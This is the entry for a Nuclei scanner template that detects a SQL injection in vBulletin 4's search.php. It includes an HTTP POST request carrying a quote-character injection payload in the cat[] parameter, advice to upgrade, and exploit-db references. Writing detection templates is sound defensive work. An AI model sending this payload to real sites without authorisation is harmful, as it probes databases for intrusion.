# Nuclei Template: vBulletin `Search.php` - SQL Injection
**Template ID:** vbulletin-search-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`vbulletin-search-sqli.yaml`)

## Vulnerability Information & PoC

## Description
vBulletin 4 is vulnerable to an SQL injection vulnerability, which may allow an attacker can execute malicious SQL statements that control a web application's database server.

## Steps to reproduce / Exploit Payload
```http
POST /search.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

contenttypeid=7&do=process&humanverify=1&cat[]=-1%27
```

## Remediation
Upgrade to the latest version of vBulletin.

## References
- https://www.exploit-db.com/exploits/17314
- https://web.archive.org/web/20181129123620/https://j0hnx3r.org/vbulletin-4-x-sql-injection-vulnerability/
